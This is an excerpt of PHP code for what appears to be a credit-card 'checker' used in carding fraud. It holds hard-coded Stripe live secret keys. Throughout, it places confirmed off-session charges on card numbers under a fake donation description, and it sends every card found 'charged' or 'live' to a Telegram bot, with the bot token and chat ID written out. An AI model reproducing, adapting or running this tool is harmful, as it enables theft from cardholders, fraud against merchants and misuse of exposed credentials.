...
if(!$sk){
  #$sk = "";
  $sks = array(
    "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 ",
    "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",
    "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"
);
...
$forwardcharged="https://api.telegram.org/bot6306193465:AAETV6LmkQCoVayOxhK4PFb1kR0zQQun1w0/sendMessage?chat_id=5888601135&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ ARPIT ITACHI CHARGED  | *$brand* *$category* *$type* |%0A*$bank* | *$country*";

$forwardcvv="https://api.telegram.org/bot6306193465:AAETV6LmkQCoVayOxhK4PFb1kR0zQQun1w0/sendMessage?chat_id=5888601135&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ ARPIT ITACHI CVV*LIVE$brand* *$category* *$type* |%0A*$bank* | *$country*";

$forwardccn="https://api.telegram.org/bot6306193465:AAETV6LmkQCoVayOxhK4PFb1kR0zQQun1w0/sendMessage?chat_id=5888601135&parse_mode=MarkDown&text=$emoji | `$lista` |%0A✅ ARPIT ITACHI CCN LIVE *$brand* *$category* *$type* |%0A*$bank* | *$country*";
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=𝙅𝙚ArpitItachi Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
...
if(strpos($result2, '"seller_message": "Payment complete."' )) {
    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CCN Charged ✅@ArpitItachi<br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
    $msg = 
    "#LIVE CC: ".$lista." 
    Result: CHARGED\r\n";
    $apiToken = "6306193465:AAETV6LmkQCoVayOxhK4PFb1kR0zQQun1w0";
    $logger = ['chat_id' => $bot,'text' => $msg ];
